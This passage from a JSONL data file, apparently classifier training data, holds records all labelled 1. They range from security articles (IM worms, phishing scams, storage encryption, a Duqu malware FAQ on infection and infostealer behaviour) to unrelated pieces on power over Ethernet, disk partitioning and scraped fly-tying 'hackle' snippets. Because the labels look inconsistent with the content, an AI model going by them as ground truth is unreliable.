hacktivists and not the most competent ones.\nThe Islamic hactivists have an image problem, in that many of them have supported Islamic terrorist groups and urged everyone to kill infidels (non-Moslems). Since Islamic terrorists have proved more adept at killing fellow Moslems, you would think Islamic hacktivists would protest against this. Most have not and continue to ascribe the misdeeds of Islamic terrorists as part of a vast American and Israeli conspiracy. This attitude does not work when you are trying to create effective hacker tools either.", "label": 1}
{"text": "This just had some basic tips in order to avoid malware issues. Most of it is common knowledge but just some key points:\n- Install anti-malware programs on the computer. More than one can be beneficial since different programs update at different times so one might not catch something that another would. Also, make sure they are always fully updated.\n- Use strong passwords. The article recommends passwords at least 14 characters long but even longer is better. Stronger passwords use upper and lowercase letters, non-alphabetic characters, and tend not to follow a recognizable pattern.\n- Don’t be tricked. Possibly the most important piece of information contained in the article had nothing to do with technology. If something online doesn’t seem safe, odds are that it isn’t and a good amount of the time things that do seem relatively safe can still contain malware. Knowing this, one of the most effective strategies is to distrust any unknown sites, downloads, or links and hopefully whatever anti-malware software is installed can filter out anything that might slip by.", "label": 1}
{"text": "What are IM attacks?\nAs computer security has improved, and users have gotten more savvy about not opening every attachment that\nlands in their in-boxes, hackers and virus writers have been recognizing and exploiting the opportunities presented\nby IM-based attacks, the numbers of which have risen sharply over the last years.\nOn the rise\nInstant messaging clients like AOL Instant Messenger (AIM), Yahoo! Messenger, MSN Messenger, and the chat feature in Skype have all been targeted. And unlike the simple viruses of years past, the IM threats have evolved into multi-staged attacks that have the potential to cause significant harm to users' computers.\nInstant-messaging threats work much like e-mail ones, where malware is launched when the recipient clicks on an executable file attachment or on a hyperlink that then links through to a malicious website. Instead of being sent over e-mail, however, these threats are spread through IM chat sessions.\nIM Worms and spim\nAn IM worm is self-replicating malware that spreads in IM networks. When an IM worm infects a PC, it locates the address book for the IM client, which is called a buddy list or contact list, and tries to send itself to all the infected person's contacts. Some IM worms use social engineering techniques to trick the recipient into accepting a message that contains the malicious code.\nInstant messenging software is also being used to deliver spam. Spam delivered through IM instead of e-mails is known as spim.\nThe number of IM threats such as viruses, worms, and phishing scams has been steadily increasing over the years. In December 2007, over 18 new malicious code attacks over instant messaging (IM) networks were discovered, bringing the 2007 total to 346. In 2004 there were almost no IM attacks, and in 2006 the number was around 130.\nNearly 20 percent of IM threats in 2007 were reported on the AOL Instant Messenger network, 45 percent on MSN Messenger and 20 percent on Yahoo! Messenger.\n2007 also marked the first IM prosecution in the US, punishable by $1.75 million in fines and nearly 60 years in prison, against a computer security consultant for using illegal IM botnets to hijack PayPal accounts.\nLearn more about BullGuard Antivirus.\nLearn more about BullGuard Spamfilter.", "label": 1}
{"text": "At the same time, organizations, particularly those in highly regulated sectors, find themselves subject to increasing amounts of pressure from auditors, regulators and customers to safeguard data storage from loss, theft and inappropriate access. The Payment Card Industry (PCI) Data Security Standard, which requires all payment card information to be encrypted, is one example of such regulation.\nWhen considering encryption, remember that it can be applied to data in-flight or data at-rest. Data in-flight refers to information encrypted when in transit from one point to another, for example over the local-area network (LAN) or wide-area network (WAN). Encryption of data at-rest occurs when information is stored on media such as disk or tape. Storage encryption is concerned with data at-rest rather than encryption of data in-flight, which is provided at the network layer and comes embedded in hardware from vendors such as Brocade and Cisco Systems.\nThere are several ways to enable storage encryption:\n- Through encryption technology embedded in backup software\n- Via encryption appliances that plug into storage networks\n- Through ASICs located at the drive level\n- In encryption software applied to devices and removable media\nHere's a quick overview of the pros and cons of each of these options.Encryption technology embedded in backup software\nThe functionality required to encrypt data backups is incorporated into most backup software products. The advantage of undertaking encryption in this way is that it's possible to switch on encryption functionality without the need to change device drivers or drive settings, which makes it a cost-effective option for retrofitting to existing infrastructures.\nBut there are disadvantages. Encryption software can generate throughput bottlenecks because data encrypted as it passes between the LAN and the storage infrastructure will incur a processing overhead.\nEncryption appliances that plug into storage networks\nEncryption appliances provide a relatively quick and easy means of retrofitting encryption capabilities onto existing systems because they plug directly into the fabric/network. They're best suited to large shared storage environments with bulk data encryption requirements because deploying multiple devices across the organisation can become an expensive proposition. These devices generate low performance overheads on the storage infrastructure.\nBut research firm Gartner expects appliances to be superseded over the next three to five years as encryption functionality is increasingly included natively in storage systems.\nIt's also worth bearing in mind that the reality of installing encryption appliances may not be quite as simple as vendors promise and can require third-party help. Key vendors in this space include CipherMax, CipherOptics, Crossroads Systems, Digital Security International, Exar's Hifn Technology, NetApp, SafeNet's Ingrian and Vormetric.\nEncryption using ASICs located at the drive level\nASIC chips for encryption purposes are embedded into everything from external hard drives and tape drives to storage arrays. All of the key primary storage and tape library vendors have gone down this route. The advantage of this approach is that the host system doesn't suffer any performance overhead when encryption and decryption activity take place. This is because software code is baked into the silicon of the chip.\nThe downside is the cost involved if organisations want to retrofit or replace existing kit with the new technology, not least because it comes at a premium.\nEncryption software applied to devices, removable media\nThe most common use case for encryption is to protect removable media such as laptops and portable drives, although encryption of backup tapes is becoming increasingly common. The focus on removable media is due to obvious concerns over safeguarding data when it leaves the enterprise as more people ship backup tapes offsite and use mobile equipment.\nThe Britannia Building Society in Stoke-on-Trent is encrypting removable media and also performing some native database encryption.\nLaptop hard drives are encrypted and users are prompted for a password at power on. Without a password, the disk is unreadable, even if the hard drive is installed on another machine. USB ports are locked down by a piece of software on all PCs, which means there's no way to transfer data out of the company via USB devices that are unauthorised or insecure. If an encrypted USB stick is lost, the data is still safe. LTO-4 tapes have encryption capabilities that could be used if Britannia Building Society wanted to send them offsite.\nDylan Mathias, Unix and storage manager at Britannia Building Society, declined to name the specific products used at his firm but said, \"All these technologies are designed to prevent the data from being read if the device involved falls into the wrong hands. You have to assume sooner or later you will lose one of these things. The hardware can easily be replaced; the loss of data cannot.\"\nInhibitors to storage encryption technology\nSome of the major reasons why encryption technology isn't universally applied at the moment include the upfront purchasing costs often associated with encryption, and user concerns that encrypting and decrypting data can slow data throughput.\nDeploying encryption technology at the storage subsystem is only \"just beyond early adoption\" and is unlikely to move into the mainstream for another three to five years, according to Rene Millman, a senior research analyst at Gartner. One reason for this lack of uptake is that organisations often believe data held within the walls of the enterprise to be less vulnerable.\nFor example, Britannia Building Society's Mathias isn't convinced about the need to encrypt at the array level.\n\"The theory behind it is that someone might steal an entire array, but you'd need a JCB to do that and it would be quite an achievement,\" he said. \"I can see the argument for encryption on portable devices and tape backups, but I'm not convinced of the need to encrypt the entire array.\"\nBut Andrew Reichman, a senior analyst at Forrester Research, believes such technology can play a role in securing data should hardware need to be returned to vendors or when it reaches end of life. Without an encryption key, third parties can't read sensitive corporate data. As a result, organisations can destroy the encryption key rather than pay for data destruction services.\n\"It's not an area that has been focused on much, but people are starting to see the value of addressing this issue in a more systematic way,\" Reichman said.", "label": 1}
{"text": "Why do Passwords Appear as Dots in a Form?\nWhen I want to subscribe myself for a newsletter, website, online application or want to sign in, I need to put in my password. This is the easiest way to protect websites/applications and it works, but what I really don’t understand is why passwords appear as dots in the textfield.\nTo me this is against the basics of user friendlyness because people need to see a clear result of their action, eg. a keystroke. This way you can’t know which dot represents which character (unless you start to count), so there is a possibility that you made a typo in the password. Of course this can be simply overcome with a second textfield which checks if both passwords are the same, but what happens if you copied the first password and paste it in the second textfield? Your subscription is send of for confirmation with the wrong password.\nIt’s been encouraged to make your passwords longer (8-16 characters) and to use combinations of different characters (abc – 123 – ?!), otherwise the form will not be send away. These kind of demands make it even more difficult to avoid typos. Although I understand that you can’t put just anything in the textfield and you should think this over carefully, that doesn’t mean it can’t be done in a user friendly manner.\nThe more I think about it, the more I wonder why and when these dots appeared for the first time… I guess it was in the ’90 when only one person had a pc and had to share it with the rest of the village. Whenever the user switched the power on, the others were watching as well, out of curiosity. Back then they had to find a way to scramble the password while typing it into the textfield to keep it a secret. All stupidity aside, this could have been a nice story, no?\nThe obvious reason why we still set the password field as dots, is security… we didn’t want people to have a peek in the ’90 and we still don’t allow it now. The computers are getting smaller with the year and what started out as a computer for the entire village is now a small electronic device inside your pocket. The pc has never been more personal than now, making the peeking-over-your-shoulder story less likely.\nThis solutions seems to work just fine but it has its flaws. First of all it requires an extra click from the user which can be annoying for those who go through forms with the tab key. Secondly, what if you checked your password by pushing the button and forgot to change it back to password mode?\nFor this reason I came up with another idea, no unnecessary clicks and easier to go through the form. The status of the text field is set to ‘password’, but once you enter it with the tab key or mouse click the status is changed to ‘text’ which makes your password readable. When you leave the text field, the status is changed back to ‘password’, making your password again unreadable. Unfortunately, after two days of coding I still didn’t get the result I was hoping for. After searching on the web I’ve found an example made by viget.com.\nI would have liked to put the example in this post but it was conflicting with the current version of jquery.\nI’ve tried the code in different browsers and it works in Internet Explorer (6,7 and 8), Firefox, Safari and Google Chrome. Special thanks to the people of viget.com\nI’ve been looking into free online mail applications and found mailchimp as a nice solution. Apparently mailchimp is using the second solution for the password-in-dots story. Have a look at the image below.\nMailchimp prompts the user to fill in their password only once. With the help of a little checkbox, you can quicly unveil the password to check it for possible typo’s. jQuery has a little plugin to unmask the password by clicking on a checkbox.\nReceive updates via RSS mail\nGet the latest articles and resources straight in your inbox, nice and easy. Have a preview of the email. You can, of course, unsubscribe at any time.", "label": 1}
{"text": "Progressive Business Publication Scam Alert\nIdentity thieves are constantly creating new ways to scam unsuspecting people. That’s why it’s essential to recognize the three most common technology-related scams known as Phishing, Vishing and SMiShing.\nPhishing scams use email, while Vishing attacks come over land telephones. SMiShing scams target the users of mobile devices.\nThe common element to all three scams is to collect confidential personal and financial information.\nHere’s a closer look at how they work.\nPhising is an attempt to get your password or credit card number by sending out phony email that looks like it comes from a trustworthy entity, usually a bank but possibly also a social website, an online payment processor or even an IT company. The phony email contains a link to a site that looks and feels like a real company.\nIf you click the link and go to the site, you’re directed to enter financial or other details, even to log in if it’s a mock up of your real bank site.\nBut even if you do none of these, the site has probably already downloaded malware onto your computer to try to capture your private information.\nThe term Phising is derived from fishing, and is a reference to baiting a victim into biting on a malicious link, etc.\nVishing scams use Internet-based telephone systems to gain access to private and personal data. The term comes from “voice” and phishing. It goes like this: You answer the phone and an automated recording informs you your credit card, or maybe your bank account, had suspicious or fraudulent activity and you need to call a certain number right away.\nThe recording tells you the number to call and says your account or card has been deactivated until further notice. When you call, you get another recording telling you to enter your bank or credit card number on the key pad to confirm who you are. Don’t do it.\nThis kind of scam is also used to get a security PIN, expiration date, date of birth, etc.\nSMiShing is similar to the other scams, but uses cell phone text messages to deliver the bait and get someone to divulge personal information. The name is a combination of Short Message Service technology and phishing.\nThe hook in this scam is a website or phone number the user is required to connect with.\nSmiShing often involves something that needs immediate attention, such as confirming you’ve signed up for a discounted subscription, and you’ll be charged $8 a day unless you cancel the order. Then it gives you a phone number to call to cancel.\nOf course, you can’t cancel without entering your vital personal and financial information, which is the raison d’etre behind the scam in the first place.\nA recent variation of this involved retail giant WalMart, which issued a fraud alert regarding a large number of SmiShing texts that offered a phony $1,000 gift card as bait.\nThe key to handling all three of these scams requires the same reality check: If you feel a need to contact your bank or credit card company, use the number on the back of your credit card or call or visit a branch office you know for sure is real!", "label": 1}
{"text": "As network technology becomes increasingly important to operate security systems, and affordably priced Internet protocol (IP) cameras and video management systems (VMS) are used more often, system designers and installers, such as electrical contractors, are realizing the need and efficiency of using power over Ethernet (PoE).\nFirst used for voice over IP (VoIP) telephones, PoE has gained popularity as a means of safely allowing power, along with data, to pass on Ethernet cabling.\n“PoE voltage is 48V DC and sourced from an injector, midspan or switch, which provides power. A PoE source will only provide the necessary power when it recognizes the class or signature of a compatible network device so that, in the event a non-PoE IP device is inadvertently connected, the PoE source will not provide power and damage the device,” said Ronnie Pennington, national accounts manager for Altronix Corp., Brooklyn, N.Y.\nFrom VoIP in the 1990s, PoE is now migrating to powering security system components, such as IP cameras and access control and sensor equipment.\n“It’s a natural choice for the security market because it enables the user to leverage a common network infrastructure,” said Patrik Pettersson, product analyst for Axis Communications Inc., Boston.\nIt’s also more environmentally friendly because, if the device only needs 7 watts (W) to operate, the switch only allocates the required operating wattage, even though the original IEEE 802.3af 2003 PoE standard provides up to 15.2W of DC power to each device.\n“First and foremost, PoE standardizes the deployment of security system devices on one type of cabling infrastructure so that now only one Cat 5 or 6 data cable can be used for video transition, power to the product and control of the camera,” Pettersson said.\nAnd because the network switch now also functions as the power supply, that switch can be protected by an uninterruptible power supply (UPS) battery backup.\n“A power outage or other disaster is one of the most critical times for security and surveillance. With a proper disaster backup and recovery strategy, the end-user can keep the PoE-powered surveillance system running along with other critical applications,” he said.\nSince the PoE cable is directly tied into the intelligent network system, the power supply also is now intelligent, enabling remote control of individual circuits and devices, diagnostics and maintenance capabilities, Pettersson said. Intelligent switches that enable the user to remotely toggle the power on and off provide the choice of when to reboot a device (if necessary while troubleshooting) for minimal impact to the security and surveillance system.\n“It also eliminates the need for a truck and ladder to reach the camera for a physical reboot,” he said.\nOne of the challenges, however, of using PoE for security system power is the limitation of structured cabling to transmit beyond 100 meters, according to Pennington.\n“IP data can be extended up to 600 meters using Ethernet repeaters, but installers and system integrators should take into consideration that there will be a voltage drop along the way,” he said.\nWhile the data range can be efficiently extended using plug-and-play repeaters, the voltage, in that case, may be insufficient to power the device, and a local power source may be needed.\n“Because of this, contractors need to perform proper power calculations and invest in PoE testing tools, which test both the power and data integrity of a multiple cable system,” Pettersson said.\nFactors to consider\nIn choosing to use, specify or design PoE switches for a security system, it is important for contractors to select a switch that is compatible with the system’s edge devices’ power requirements and offers desired features, Pennington said.\n“It is ideal to use a PoE midspan or injector with an external Ethernet switch, rather than an integrated PoE switch for security. If the PoE switch is shut down for maintenance or if power is lost, the surveillance system would be inoperable, but when using a PoE midspan or injector, power is still supplied,” he said.\nContractors also need to consider the power budget of the security system’s devices and perform power-draw calculations, which includes reading the PoE network switch manual and fully understanding the specifications.\n“For example, if a 24 port is shipped with a 150W power supply and it offers PoE on all 24 ports, it will not support 15.4W per channel, as outlined by the current standard,” Pettersson said.\nMoving forward, the IEEE 802.3at standard in development, also known as PoE+, will enable up to 50 or 55W sometime within the next three years.\n“The standard is being driven upward by the more powerful security system devices that are being developed, even as those devices are becoming more energy-efficient,” Pettersson said.\nBREMER, a freelance writer based in Solomons, Md., contributes frequently to ELECTRICAL CONTRACTOR. She can be reached at 410.394.6966 and firstname.lastname@example.org.", "label": 1}
{"text": "Divided We Stand: A Guide to Partitioning Your Hard Drive\nWant to make your computer faster, easier to manage, and able to share data more securely? Dividing your hard drive into smaller sections called partitions can make your computer more manageable. Windows® 7 comes with an easy-to-use disk management tool that will help you partition your drive—and you won’t have to buy additional software.\nWhy partition a drive? Here are a few common reasons:\n- More than one person uses the computer and you want to keep separate files—and access rights—for security reasons. Partitioning can be particularly helpful when you share a PC with a child.\n- You want to squeeze more performance out of your PC. Partitioning a large drive into smaller units improves performance by decreasing the amount of travelling the drive’s read/write head has to do when it searches for data. A partition also shrinks the size of the tables the computer uses to keep track of where data is stored, further improving performance.\n- You want to make your system more manageable. If you keep your operating system and applications on a partition separate from your data, the data will be easier to back up and easier to restore. What’s more, if you need to reinstall the operating system, you can do it without worrying about the data on the other partition.\n- You want to make your data more secure. If part of your hard drive becomes corrupted or infected with malware, the other partitions have a good chance of remaining unscathed.\nStep by Step\nPartitioning a hard drive is simplest if you haven’t already loaded applications and data, so if you’ve just purchased your PC, now is the time to do it. However, you can do it at any time. Just be sure you do a complete backup before you start.\nTo turn one partition into two partitions:\n1. Open the Control Panel, Administrative Tools and click Computer Management.\n2. Double-click Storage in the middle pane, and then double-click Disk Management\n3. \"Disk 0\" represents your primary hard drive. If your drive has not been partitioned, the C: drive will fill most or all of the space\n4. Right-click on the C: drive or on unpartitioned space and click \"Shrink Volume.\" (Windows refers to partitions as volumes.) Windows will you for the amount of space you wish to shrink; this will become the amount of space available for the new partition. Choose an amount that matches the amount of data you expect to store there: Less for\n5. Follow the s to complete the shrink function.\n6. You will now have unpartitioned space in which you can create a second partition. Right-click in this unallocated space and click \"New Simple Volume.\" Follow the s to set the size of the partition and assign a drive letter to this space.\n7. Finally, you will be ed to format the new partition you’ve made. Select OK at the s to complete the format operation. Your new partition is ready to use.\nFor more help on disk partitioning, consult this guide\nThe above content is provided for information purposes only. All information included herein is subject to change without notice. Samsung Electronics is not responsible for any direct or indirect damages, arising from or related to use or reliance of the above content.\n- Why LED Monitors Are Best for You\n- Which is Right for You: Netbook or Notebook?\n- 4 Ways to Back Up Your Laptop\n- Mobile CPU Roadmap: Picking the Right Intel Chip\n- Samsung Laptops: Something for Everyone\n- Laptop Memory Basics – What's Best: DDR2 or DDR3?\n- HDTV Monitor 101\n- Top Ten Benefits of SSD\n- Green Report Card\n- Finding the Killer Computer", "label": 1}
{"text": "This is an active investigation by Kaspersky Lab's Global Research & Analysis Team. We will be updating this FAQ document as necessary.\nDuqu is a sophisticated Trojan which seems to have been written by the same people who created the infamous Stuxnet worm. Its main purpose is to act as a backdoor into the system and facilitate the theft of private information. This is the main difference when compared to Stuxnet, which was created to conduct industrial sabotage. It's also important to point out that while Stuxnet is able to replicate from one computer to another using various mechanisms, Duqu is a Trojan that doesn't seem to replicate on its own.\nUnlike Stuxnet, Duqu doesn't target PLC/SCADA equipment directly, although some of its subroutines could be used to steal information related to industrial installations. It appears that Duqu was created in order to collect intelligence about its targets, which can include pretty much anything that is available in digital format on the victim’s PC.\nIn the cases we have analysed, Duqu infects a computer through a targeted attack involving a Word document which exploits the CVE-2011-3402 vulnerability. This is a 0-day vulnerability in the Windows kernel component Win32k.sys which allows the attackers to run code with the highest privilege level, bypassing pretty much most of the protection mechanisms from Windows or security software. According to our knowledge, Duqu is the only malware using this vulnerability to infect computers. All Kaspersky Lab security solutions detect this vulnerability under the name Exploit.Win32.CVE-2011-3402.a as of November 6, 2011.\nThere is indeed a 0-day vulnerability being used to infect computers in the initial phase. Microsoft released an advisory (2639658) with basic information and mitigation steps.\nDuqu was brought to the attention of the security community by the Hungarian Research Lab CrySyS. They were the first to point out the resemblance to Stuxnet and perform what remains the most thorough analysis of the malware yet.\nThe first Duqu attacks were spotted as early as mid-April 2011. The attacks continued in the following months, until October 18, when news about Duqu was made public.\nIt appears that there are at least seven variants of the Duqu drivers, together with a few other components. These are all detected with different names by various anti-virus companies, creating the impression that there are multiple different variants. At the time of writing, we are aware of two Infostealer components and seven different drivers. Additionally, we suspect the existence of at least another Infostealer component which had the capability to directly search and steal documents from the victim's machine.\nWhile there are indeed reports indicating that the main goal of Duqu is to steal information from CAs, there is no clear evidence at this time to support this claim. On the contrary, we believe the main purpose of Duqu was different and CAs were just collateral victims.\nOne suspicion is that Duqu was used to steal certificates from CAs that can be used to sign malicious code in order to make it harder to catch. The functionality of the backdoor in Duqu is actually rather complex and it can be used for a lot more. Basically, it can steal everything, however, it looks like attackers were particularly interested in collecting passwords, making desktop screenshots (to spy on the user) and stealing various kinds of documents.\nThe initial Duqu C&C server, which was hosted in India is no longer active. Just like in the case of Stuxnet, it was pulled offline pretty quickly once the news broke. In addition to this, we are aware of another C&C server in Belgium, which was also quickly taken offline. Actually, it appears that every single Duqu targeted attack used a separate C&C server.\nMaybe the author was a fan of round numbers, such as 6x6? :) Actually, the time for which Duqu is running in the system is defined by the configuration file and varies between the attacks. We have also seen instances where the duration was set to 30 days.\nThe same gang who was behind Stuxnet. Curiously, they seem to have picked up an interest in astronomy; the infostealer executable has a portion of a JPEG file picked up by the Hubble telescope (“Interacting Galaxy System NGC 6745”):\nThe picture portrays the aftermath of direct collision of two galaxies(!), several million of years ago. You can read the story here.\nUPDATE (November 15, 2011):\nWhen activated, the main Duqu program body connects to its C&C server and downloads updates and supplemental modules. One such module is the Duqu \"infostealer,\" for which two versions are known and others are believed to have existed at various points in the time.\nThe \"infostealer\" module is downloaded in memory and executed through the process injection technique used by Stuxnet and Duqu to avoid temporary files. This is done in order to make sure that the \"infostealer\" component (and other Duqu updates) will not be intercepted or left behind on an infected machine. It also means that they have a limited lifetime, basically until the next system reboot.\nThe most powerful version of the \"infostealer\" has the ability to intercept keystrokes, it makes screenshots of the whole screen (first time) and of the active window, collects the IE browsing history and various data related to the system network configuration. There is also code which can do browsing of network shares. All this information is nicely packaged into a file that is written into the %TEMP% folder by default. It is a compressed BZIP2 format with modified headers. Thanks to the BZIP2 compression, the files are smaller than you'd think.\nThe \"infostealer\" components we have seen create files with the name \"~DQx.tmp\". In addition to this, we are aware of other files with the name \"~DFxxxxx.tmp\" and \"~DOxxxxx.tmp\". The \"DF\" and \"DO\" have a similar format and appear to have been generated by an earlier version of the \"infostealer\". They also contain more information, including various files the victim PC such as Word or Excel documents. The \"~DF\" files are generally much bigger, due to their additional file content.\nIn all cases, they are easy to recognize by the header \"ABh91AY&SY\". If you find such files in your PC then most likely you've been a victim of Duqu. If you'd like to scan your system for such files, the nice people at CrySyS have a set of tools that can help.\nDuqu and Stuxnet have a lot of things in common. Usage of various encryption keys, including ones that haven't been made public prior to Duqu, injection techniques, the usage of zero-day exploits, usage of stolen certificates to sign the drivers, all of these make us believe both have been written by the same team.\nSo, what does that mean exactly? Simply put, different people might have worked on Duqu and Stuxnet, but most likely they worked for the same \"publishing house.\" If you want an analogy, Duqu and Stuxnet are like Windows and Office. Both are from Microsoft, although different people might have worked on them.\nIn the incidents we have analyzed, Duqu arrives in the system in the form of a Microsoft Word Document. The document contains an exploit for the vulnerability known as CVE-2011-3402. This is a buffer overflow in a function of Win32k.sys which deals with True Type fonts. To exploit this specific vulnerability, an attacker needs to craft a special True Type Font and embed it into a document, for instance, a Word Document.\nNow, for the connection part - in the incident we've analyzed (and this is also true for the other known incident), the attackers used a font presumably called \"Dexter Regular\", by \"Showtime Inc.,\" (c) 2003. This is another prank pulled by the Duqu authors, since Showtime Inc. is the cable broadcasting company behind the TV series Dexter, about a CSI doctor who also happens to be a serial killer who avenges criminals in some post-modern perversion of Charles Bronson's character in Death Wish.\nWe hope they are just fans of Dexter.\nInterestingly, the same constant can be found in Duqu as well. The Hungarian CrySyS lab was the first to point out the usage of 0xAE790509 in Duqu. In the case of Stuxnet, the integer 0x19790509 is used as an infection check; in the case of Duqu, the constant is 0xAE790509.\nWhat is less known is that 0xAE790509 was also used in Stuxnet, however, prior to Duqu this was not included in any of the public analyses we are familiar with.\nThere are also many other places where the constant 0xAE is used, both in Duqu and Stuxnet.\nFinally, the constant 0xAE240682 is used by Duqu as part of the decryption routine for one of the known PNF files. In case you are wondering, 24 June 1982 is indeed an interesting date - check out the case of BA flight 9.\n* Research by Kaspersky Lab Global Research & Analysis Team.\nCostin Raiu of Kaspersky Lab's Global Research and Analysis Team talks about the investigation into Duqu, the likelihood that it was written by the same team as Stuxnet, whether a government is behind its development and what mistakes the authors made.\nDownload the podcast from the Threatpost site.\n2011 Oct 22, 20:01\nDuqu can steal everything?\n@Symantec says this is targeted to specific organizations, possibly with a view to collecting specific information that could be used for future attacks. What kinds of data are they looking for and what kinds of future attacks are possible?", "label": 1}
{"text": "- Definition of hackle in the Online Dictionary. Meaning of hackle. Pronunciation of hackle. Translations of hackle. hackle synonyms, hackle antonyms. Information about hackle in the free online English dictionary and encyclopedia. saddle hackle. — “hackle - definition of hackle by the Free Online Dictionary”,\n- Far West Fly Shop offers the best selection of fly tying hackle, including Whiting hackle fly and a variety of tying capes. Find the best quality here. — “Fly Tying Hackle - Whiting Hackle | Fly Tying Capes”,\n- The Hook & Hackle Company encourages support of those \"Wounded Warriors\" who have The Hook & Hackle Company Guarantee. If for any reason you're unhappy with any Hook & Hackle brand product, for whatever reason,. — “Hook & Hackle Company”,\n- Definition of hackle from Webster's New World College Dictionary. Meaning of hackle. Pronunciation of hackle. Definition of the word hackle. Origin of the word hackle. — “hackle - Definition of hackle at ”,\n- Guide and fly shop serving Rock Creek and the Bitterroot, Blackfoot, and Clark Fork Rivers of Western Montana. The Grizzly Hackle has the area's finest guiding staff, a dedicated crew that has introduced thousands of anglers - beginners and experts alike - to the trout of western Montana. — “Grizzly Hackle The Premier Fly Shop and Outfitter in the”,\n- The hackle is a feather plume that is attached to the headdress. In the British Army and the armies of some Commonwealth countries the hackle is worn by some infantry regiments, especially those designated fusilier regiments and those with Scottish and Northern Irish origins. — “Hackle”,\n- Conranch Hackle produces a Premium dry fly hackle that is second to none. This is an old flock that has consistently produced top quality hackle and saddles. — “Conranch Fly Tying Hackle”,\n- Definition of word from the Merriam-Webster Online Dictionary with audio pronunciations, thesaurus, Word of the Day, and word games. plural a : erectile hairs along the neck and back especially of a dog b : temper, dander. — “Hackle - Definition and More from the Free Merriam-Webster”, merriam-\n- Quality custom tied flyfishing flies for the discriminating flyfisherman. Welcome to ! Welcome to ! We offer hand-tied flies tied by expert fly tier David Tomé. A variety of field tested fly patterns are available as well as custom tied flies. — “Welcome to !”,\n- Learn about Hackle on . Find info and videos including: How to Tie a Wet Hackle, Types of Soft Hackles, How to Use Hackle Pliers for Fly Fishing and much more. — “Hackle - ”,\n- The terms \"hackling a fly\" or \"wrap the flies hackle\" refers to tying a feather and wrapping it around the hook shank of the fly. Hackle from a rooster are usually used for dry flies because they are hard and stiff, do not soak up water and support the fly on the water. — “Fly Tying Hackle Selection, Fly Tying Workshop and”,\n- West Yellowstone fly shop with a huge selection of Whiting hackle, saddle hackle and fly tying materials from JimsFlyco at great prices. — “Whiting Hackle | West Yellowstone fly shop | JimsFlyco”,\n- (usually now, in plural) By extension (because the hackles of a *** are lifted when it's angry), the hair on to hackle (third-person singular simple present hackles, present. — “hackle - Wiktionary”,\n- hackle n. Any of the long, slender, often glossy feathers on the neck of a bird, especially a male domestic fowl. — “hackle: Definition from ”,\n- Shop for Hackle. Price comparison, consumer reviews, and store ratings on . — “Hackle - - Product Reviews, Compare Prices, and Shop at”,\n- W. W. Doak Miramichi Atlantic Salmon Fly Fishing Tackle Shop - Sage, St.Croix, Islander, Lamson, Ross, Teton, Abel, S. A. Mastery, Simms, Atlantic Salmon Flies & Leaders Althought it is not as long as the hackle found on most saddle patches, it is a little wider, making it better for larger flies. — “Hackle - W. W. Doak and Sons Ltd. Fly Fishing Tackle”,\n- hackle lodge luxury hotel accommodation Mpumalanga,dullstroom,fly fishing leisure cottagesSouth Africa.Hackle Lodge,Machadodorp,beautiful countryside 2 hours drive from Johannesburg,Gauteng. — “Hackle Lodge Country Estate,South Africa-Luxury lodge”,\n- Hackle definition, one of the long, slender feathers on the neck or saddle of certain birds, as the domestic rooster, much used in making artificial flies for See more. — “Hackle | Define Hackle at ”,\n- The hackle is a feather plume that is attached to the headdress. In the British Army and the armies of some Commonwealth countries the hackle is worn by some infantry regiments, especially those designated fusilier regiments and those with Scottish and Northern Irish origins. — “Hackle - Wikipedia, the free encyclopedia”,\n- howard hackle is a family operated hackle farm located in didsbury, alberta, canada. our northern location leads to enhanced hackle quality as the birds adapt with increased feather population and barb count. this produces the highest quality. — “Welcome to Howard Hackle: About Us”,\n- Hackle Pliers Manufacturers & Hackle Pliers Suppliers Directory - Find a Hackle Pliers Manufacturer and Supplier. Choose quality Hackle Pliers Manufacturers, Suppliers, Exporters at . — “Hackle Pliers-Hackle Pliers Manufacturers, Suppliers and”,\n- Fly Tying Materials, Rare Fly Tying Materials, Fly Tying Vises, Tube Fly Materials, Tube Flies, Fly Tying - Hackle, Medium Dyed Blue Eared Pheasant, Barred Variant Schlappen, Spey Plumes, Blue Eared Pheasant, Dryfly Hackle, Ostrich, Schlappen,. — “Fly Tying Materials, Rare Fly Tying Materials, Fly Tying”,\nrelated images for hackle\n- Quotes for custom colors and quantities available by request Email the office Colors Available Blue Green Teal Black Purple Black Blue Black Red Black Orange Black Green Black Lt Blue Black\n- I think the flames would be a progression of the red to orange to gold to chartruse I m worried that the pink feathers would not carry to the bottom but I don t want a fire colored bust\n- hackle2 jpg\n- もありけっこう病みつきになっていきます 評判の良かったものを巻こうとすると マテリアルが足りなくなり最近は買い足しています 写真のハックルはホワイティングのシルバーグレードですが さすがホワイティング博士 その進化たるや信じられないほどです\n- hackle1 JPG\n- ＣＯＱ ＤＥ ＬＥＯＮ Ｓｏｌｉｄ 蛍光オレンジ ¥１５００ ＵＰ画像 通常 Ｃｏｑ Ｄｅ Ｌｅｏｎ はドライフライのテールやマドラーミノーのハックル等にお使いいただけますが 今回\n- The price will be determined by current market prices for steel and the US dollar vs the Canadian dollar Please send your specificaitons and I will get a current price for you And here is the man that makes all these combs possible\n- hackle1 jpg\n- 21mm x 56mm 7 8 x 2 1 4 Jaw length 8mm 5 16 Price is $3 95 each\n- 1 per color in stock for special price $35 00 ea Quotes for custom colors and quantities available by request Email the office\n- Homer s Newest Fly Shop and KGB headquarters the Hackle Shack offers hand tied flies premium gear and guided trips to world class places Knowing Where to Go The Hackle Shack offers a large menu of guided trips and here are just a few 7 Days on the Alagnak The Alagnak offers one\n- Wind the hackle from the front through 3 turns making sure the fibres do not trap each other back towards the thread Tie off the hackle with 2 3 turns and snip off waste as close to the hook as possible\n- インド Ｃｏｃｋ サドル ダイド 全３種 ¥５８０ Ｆｌｙ Ｓａｍｐｌｅ こちらから ＵＰ画像 ◇蛍光オレンジ ◇蛍光イエロー ◇蛍光グリーン スペイ コック ハックル ナチュラル 全３種 ¥５５０\n- =DOWNLOAD= 3d example files\n- Here s one with saddle and pea*** in the loop Finished body\n- Finished body Sorry bout the poor pics I kinda rushed this post but you get the idea Wasatch made a very comprehensive DVD with Mitch demonstrating all the techniques of the tool It takes some\n- hackle jpg\n- live in a human world Kind of a reverse Dr Doolittle gadget Very cool photo reads I really love you 90 wpm Alright 80 wpm Walkies 55 wpm I d Like My Dinner 40 wpm Update 3 7 08 I received a lovely note from James Auger one of the LED Dog Tail Communicator designers He shared one of his other ingenious dog devices The Augmented Dog Hackle\n- click for larger pics Then I got the hackle out and processed the grapejuice dyed fiber shetland + silk and the red cabbage dyed fiber shetland + silk + mohair\n- eq2 hackle jpg\n- Metz hackle1 JPG\n- ＣＯＱ ＤＥ ＬＥＯＮ 